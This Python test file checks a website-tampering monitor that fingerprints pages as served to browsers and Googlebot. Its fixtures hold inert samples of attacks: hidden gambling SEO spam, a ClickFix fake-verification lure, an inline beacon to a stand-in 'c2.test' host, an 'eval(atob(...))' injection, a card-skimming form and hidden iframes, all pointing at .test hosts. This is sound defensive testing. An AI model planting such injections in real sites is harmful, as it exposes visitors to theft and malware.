"""Content fingerprints of Watched pages (A10), from served_probe.collect over in-process pages.

The pages are inert stand-ins: judol links point at .test hosts and the ClickFix prompt's
clipboard command is a harmless placeholder. No test reaches a real host.
"""
import base64
import hashlib

import pytest

from numen import served, served_probe

TARGET = {"url": "https://shop.test/", "user_agents": ["browser", "googlebot"], "max_scripts": 20,
          "max_bytes": 7 * 1024 * 1024}

# A minified bundle: rebuilt, its file name's hash and its short identifiers change, nothing else.
BUNDLE = {
    "3f9a1c2b": 'function a(b){var c=n(4821);return b+c.x}window.app=a;/* build 1 */',
    "9e8d7c6b": 'function q(z){var k=r(9310);return z+k.x}\nwindow.app=q; /* build 2 */',
}


def shop(nonce, csrf, auth, wp, stamp, build, extra_head="", extra_body=""):
    """The fixture shop's homepage. nonce, csrf, auth, its WordPress nonce wp and its render
    timestamp rotate on every request; build is the bundler hash of its app script."""
    return f"""<!doctype html><html><head><title>Toko Batik Sari</title>
<meta name="csrf-token" content="{csrf}">
<script nonce="{nonce}">window.csrfToken = "{csrf}"; var cart = [];</script>
<script>var wpApiSettings = {{"root":"https://shop.test/wp-json/","nonce":"{wp}"}}; var renderedAt = {stamp};</script>
<script src="/static/app.{build}.js" nonce="{nonce}"></script>
<script src="https://cdn.shop.test/vendor.js"></script>
<style nonce="{nonce}">.hero {{ color: maroon }}</style>{extra_head}
</head><body>
<h1>Batik tulis dari Solo</h1>
<form action="/keranjang"><input type="hidden" name="_token" value="{csrf}">
<input type="hidden" name="authenticity_token" value="{auth}"><input type="hidden" name="_wpnonce" value="{wp}"></form>
<a href="/produk?_token={csrf}">Produk</a> <a href="https://shop.test/kontak">Kontak</a>{extra_body}
</body></html>"""


# Judol: Indonesian gambling SEO spam, injected for search engines only.
JUDOL = """
<div style="display:none"><a href="https://slot-gacor.test/daftar">Situs Slot Gacor Hari Ini</a>
<a href="https://slot-gacor.test/maxwin">Bocoran slot maxwin, deposit pulsa tanpa potongan</a></div>"""

# ClickFix: a fake verification prompt that asks the visitor to paste and run a command, plus the
# loader tag from an added external host. The command is a harmless placeholder.
CLICKFIX_HEAD = '\n<script src="https://cdn.clickfix-fixture.test/loader.js"></script>'
CLICKFIX_BODY = """
<div id="verify"><h2>Verify you are human</h2>
<p>Press Win+R, paste the command and press Enter to finish the verification.</p>
<button onclick="navigator.clipboard.writeText('echo asset-monitor-fixture')">I'm not a robot</button></div>"""


def rendered(n, build="3f9a1c2b", **extra):
    """The homepage as its n-th request renders it: every token rotates."""
    return shop(f"nonce{n:04d}Rk9vYmFy", f"csrf{n:04d}aGVsbG8gd29ybGQ", f"auth{n:04d}dG9rZW4", f"{n:04d}c0ffee",
                1731571200000 + n, build, **extra)


def site(pages, final=None):
    """A gateway fetch over pages ({url: body, or {user agent: body}}), recording every request.
    final maps a requested URL to the URL its redirects end at."""
    requested = []

    def fetch(url, method="GET", user_agent=None):
        requested.append((url, user_agent))
        body = pages.get(url)
        if isinstance(body, Exception):
            raise body
        if isinstance(body, dict):
            body = body.get(user_agent)
        data = b"not found" if body is None else body.encode()
        return {"url": (final or {}).get(url, url), "status": 404 if body is None else 200,
                "headers": {"content-type": "text/html"}, "sha256": hashlib.sha256(data).hexdigest(),
                "content_base64": base64.b64encode(data).decode()}

    fetch.requested = requested
    return fetch


def scripts(build="3f9a1c2b"):
    return {f"https://shop.test/static/app.{build}.js": BUNDLE[build],
            "https://cdn.shop.test/vendor.js": "(function(){var o={};window.vendor=o})();",
            "https://cdn.clickfix-fixture.test/loader.js": "/* fixture loader: inert */"}


def summaries(browser, googlebot=None, build="3f9a1c2b"):
    """Each user agent's summary of one check, the homepage as given to each."""
    fetch = site({TARGET["url"]: {"browser": browser, "googlebot": googlebot or browser}, **scripts(build)})
    return served.summaries(*served_probe.collect(fetch, TARGET))


def test_gambling_links_shown_only_to_googlebot_change_only_its_fingerprint():
    baseline = summaries(rendered(1))
    changed = summaries(rendered(2), rendered(3, extra_body=JUDOL))
    assert changed["browser"] == baseline["browser"]
    assert served.fingerprint(changed["browser"]) == served.fingerprint(baseline["browser"])
    assert served.fingerprint(changed["googlebot"]) != served.fingerprint(baseline["googlebot"])
    difference = served.diff(baseline["googlebot"], changed["googlebot"])
    assert difference["link_hosts"] == {"added": ["slot-gacor.test"], "removed": []}
    assert difference["links"]["added"] == ["https://slot-gacor.test/daftar", "https://slot-gacor.test/maxwin"]
    assert {"gacor", "maxwin", "slot", "situs", "deposit"} <= set(difference["words"]["added"])
    assert set(difference) == {"links", "link_hosts", "words"}
    assert served.diff(baseline["browser"], changed["browser"]) == {}


def test_an_added_external_script_host_changes_the_fingerprint():
    baseline = summaries(rendered(1))
    changed = summaries(rendered(2, extra_head=CLICKFIX_HEAD, extra_body=CLICKFIX_BODY))
    for agent in ("browser", "googlebot"):
        assert served.fingerprint(changed[agent]) != served.fingerprint(baseline[agent])
        difference = served.diff(baseline[agent], changed[agent])
        assert difference["script_hosts"] == {"added": ["cdn.clickfix-fixture.test"], "removed": []}
        assert difference["scripts"]["added"][0].startswith("cdn.clickfix-fixture.test/loader.js#")
        assert {"verify", "human", "robot"} <= set(difference["words"]["added"])
    assert served.diff(None, baseline["browser"])["script_hosts"] == {"added": ["cdn.shop.test"], "removed": []}


def test_rotating_nonces_csrf_tokens_and_bundler_hashes_do_not_change_the_fingerprint():
    first = summaries(rendered(1))
    rebuilt = summaries(rendered(2, build="9e8d7c6b"), rendered(3, build="9e8d7c6b"), build="9e8d7c6b")
    assert first == rebuilt
    assert {served.fingerprint(s) for s in (*first.values(), *rebuilt.values())} == {served.fingerprint(first["browser"])}
    assert any(entry.startswith("shop.test/static/app.*.js#") for entry in first["browser"]["scripts"])
    # The masked token is gone wherever the page repeated it: in its inline script and its link.
    assert first["browser"]["links"] == ["https://shop.test/keranjang", "https://shop.test/kontak", "https://shop.test/produk"]
    # A real change in the same bundle, or in the inline script, still changes it.
    edited = dict(scripts(), **{"https://shop.test/static/app.3f9a1c2b.js": BUNDLE["3f9a1c2b"] + "eval(atob(p));"})
    fetch = site({TARGET["url"]: rendered(4), **edited})
    assert served.summaries(*served_probe.collect(fetch, TARGET))["browser"]["scripts"] != first["browser"]["scripts"]
    injected = summaries(rendered(5).replace("var cart = [];", "var cart = []; fetch('//c2.test/x');"))
    assert injected["browser"]["inline_scripts"] != first["browser"]["inline_scripts"]


def test_family_and_normalised_scripts_follow_hekata():
    """Ported from hekata's gather.family() and jsdiff's normalised stream."""
    assert served.family("https://Shop.test:443/static/app.3f9a1c2b.js?v=2") == "shop.test/static/app.*.js"
    assert served.family("https://shop.test:8443/_next/static/chunks/main-1a2B3c4D5e.js") == "shop.test:8443/_next/static/chunks/main-*.js"
    assert served.family("https://cdn.test/a1B2c3D4e5F6g7H8/runtime.js") == "cdn.test/*/runtime.js"
    assert served.family("https://cdn.test/assets/index.Bq3xK9_a.js") == "cdn.test/assets/index.*.js"
    assert served.family("https://cdn.test/js/jquery.min.js") == "cdn.test/js/jquery.min.js"
    assert served.normalise_js("let total = cart.map(x => x.price) // sum\n") == served.normalise_js(
        "let total=cart.map(y=>y.price)/* other */")
    assert served.normalise_js("a.foo(1)") != served.normalise_js("a.bar(1)")
    assert served.normalise_js("n(4821)") == served.normalise_js("r(17)")
    assert served.normalise_js("x = /ab+c/g.test(s)") != served.normalise_js("x = /zz/g.test(s)")
    assert served.normalise_js("`a${b}c`") != served.normalise_js("`a${b}d`")


def test_the_probe_never_runs_a_script():
    """A10: no JavaScript from a fetched page is ever executed. Both scripts would request
    /served/executed if run; only the page and its script srcs are ever requested."""
    page = """<html><head><script src="/static/beacon.js"></script>
<script>new Image().src = "/served/executed?inline=1"; fetch("https://shop.test/served/executed")</script>
</head><body><a href="/served/executed?link=1">a link is never followed</a>
<img src="/served/executed?img=1"><link rel="preload" href="/served/executed?preload=1"></body></html>"""
    fetch = site({TARGET["url"]: page, "https://shop.test/static/beacon.js":
                  'fetch("/served/executed?script=1"); import("https://shop.test/served/executed")'})
    result, files = served_probe.collect(fetch, TARGET)
    assert fetch.requested == [(TARGET["url"], "browser"), ("https://shop.test/static/beacon.js", "browser"),
                               (TARGET["url"], "googlebot"), ("https://shop.test/static/beacon.js", "googlebot")]
    assert not any("/served/executed" in url for url, _ in fetch.requested)
    assert result["fetches"]["browser"]["scripts"][0]["status"] == 200


def test_the_probe_fetches_the_page_and_at_most_20_linked_scripts_as_each_user_agent():
    srcs = [f"js/s{n}.js" for n in range(12)] + [f"https://cdn{n}.test/x.js" for n in range(12)]
    page = "".join(f'<script src="{src}"></script>' for src in [*srcs, "js/s0.js", "data:text/javascript,1", ""])
    final = "https://shop.test/id/"  # The homepage redirects here; srcs resolve against it.
    urls = [final + src if not src.startswith("https") else src for src in srcs]
    pages = {TARGET["url"]: page, **{url: f"/* {url} */" for url in urls}, urls[3]: RuntimeError("refused")}
    del pages[urls[4]]
    fetch = site(pages, final={TARGET["url"]: final})
    result, files = served_probe.collect(fetch, TARGET)
    for agent in ("browser", "googlebot"):
        fetched = result["fetches"][agent]
        assert (fetched["url"], fetched["final_url"], fetched["status"]) == (TARGET["url"], final, 200)
        assert [s["url"] for s in fetched["scripts"]] == urls  # Same-origin and external, deduplicated, http(s) only.
        assert [url for url, ua in fetch.requested if ua == agent] == [TARGET["url"], *urls[:20]]
        assert [s["status"] for s in fetched["scripts"]] == [200] * 3 + [None, 404] + [200] * 15 + ["skipped"] * 4
        assert fetched["scripts"][3]["error"] == "RuntimeError"
        assert {s["error"] for s in fetched["scripts"][20:]} == {"limit"}
        for record in [fetched, *fetched["scripts"][:20]]:
            if record["sha256"]:
                assert hashlib.sha256(files[record["sha256"]]).hexdigest() == record["sha256"]
    assert files[result["fetches"]["browser"]["sha256"]] == page.encode()
    # The stored bytes have a budget: past it, the remaining scripts are skipped, not fetched.
    small = dict(TARGET, max_bytes=2 * (len(page) + 50))  # each user agent's share: the page and one script
    result, files = served_probe.collect(site(pages, final={TARGET["url"]: final}), small)
    statuses = [(s["status"], s["error"]) for s in result["fetches"]["browser"]["scripts"]]
    assert statuses[:2] == [(200, None), ("skipped", "budget")] and set(statuses[2:20]) == {("skipped", "budget")}
    assert sum(len(data) for data in files.values()) <= small["max_bytes"]


@pytest.mark.parametrize("injected, host", [
    ('<base href="https://evil.test/">', "evil.test"),  # every relative script and link now comes from evil.test
    ('<meta http-equiv="refresh" content="0; url=https://slot.test/daftar">', "slot.test"),
    ('<link rel="stylesheet" href="https://skin.test/theme.css">', "skin.test"),
])
def test_injected_head_elements_change_the_fingerprint(injected, host):
    baseline = summaries(rendered(1))
    changed = summaries(rendered(2).replace("<title>", injected + "<title>"))
    assert served.fingerprint(changed["browser"]) != served.fingerprint(baseline["browser"])
    assert host in served.diff(baseline["browser"], changed["browser"])["link_hosts"]["added"]


@pytest.mark.parametrize("injected, host", [
    ('<iframe src="https://evil.test/frame" style="display:none"></iframe>', "evil.test"),
    ('<form action="https://skim.test/pay"><input name="card"></form>', "skim.test"),
    ('<object data="https://evil.test/x.swf"></object><embed src="https://evil.test/y.swf">', "evil.test"),
])
def test_injected_frames_forms_and_objects_change_the_fingerprint(injected, host):
    baseline = summaries(rendered(1))
    changed = summaries(rendered(2, extra_body=injected))
    assert served.diff(baseline["browser"], changed["browser"])["link_hosts"]["added"] == [host]


def test_a_base_href_moves_the_scripts_the_probe_fetches():
    """A browser loads a relative script from the <base href>, so the probe fetches it there too."""
    fetch = site({TARGET["url"]: rendered(1).replace("<title>", '<base href="https://evil.test/"><title>'), **scripts()})
    result, files = served_probe.collect(fetch, TARGET)
    assert [s["url"] for s in result["fetches"]["browser"]["scripts"]] == [
        "https://evil.test/static/app.3f9a1c2b.js", "https://cdn.shop.test/vendor.js"]
    assert served.summaries(result, files)["browser"]["script_hosts"] == ["cdn.shop.test", "evil.test"]
    # A stylesheet's bundler hash is no change.
    assert summaries(rendered(1, extra_head='<link rel="stylesheet" href="/static/main.3f9a1c2b.css">')) == summaries(
        rendered(2, extra_head='<link rel="stylesheet" href="/static/main.9e8d7c6b.css">'))


def test_one_user_agents_scripts_never_starve_the_others_page():
    """Each user agent has its own share of the stored-bytes budget."""
    browser = "".join(f'<script src="/s{n}.js"></script>' for n in range(4))
    fetch = site({TARGET["url"]: {"browser": browser, "googlebot": "<p>" + "g" * 200 + "</p>"},
                  **{f"https://shop.test/s{n}.js": f"/* {n} */" + "x" * 600 for n in range(4)}})
    result, files = served_probe.collect(fetch, dict(TARGET, max_bytes=2000))
    assert [s["error"] for s in result["fetches"]["browser"]["scripts"]] == [None, "budget", "budget", "budget"]
    assert result["fetches"]["googlebot"]["status"] == 200 and sum(map(len, files.values())) <= 2000


@pytest.mark.parametrize("value", ["", "short"])
def test_short_or_empty_token_values_are_not_masked(value):
    """Only a token value of 8 characters or more is masked, so a short one cannot blank out words."""
    page = f'<meta name="csrf-token" content="{value}"><p>short words stay</p>'
    summary = served.summary(page.encode(), "https://shop.test/", [])
    assert summary["words"] == ["short", "stay", "words"]


def test_a_page_with_invalid_urls_is_still_summarised():
    """A hostile page cannot stop its own check: a src or href that is no valid URL is never
    fetched, and is still part of the summary (a src as inline code)."""
    page = '<script src="http://[broken/x.js"></script><script src="data:text/javascript,go()"></script><a href="http://[x">x</a>'
    fetch = site({TARGET["url"]: page})
    result, files = served_probe.collect(fetch, TARGET)
    assert fetch.requested == [(TARGET["url"], "browser"), (TARGET["url"], "googlebot")]
    summary = served.summaries(result, files)["browser"]
    assert len(summary["inline_scripts"]) == 2 and summary["links"] == ["http://[x"] and summary["link_hosts"] == []
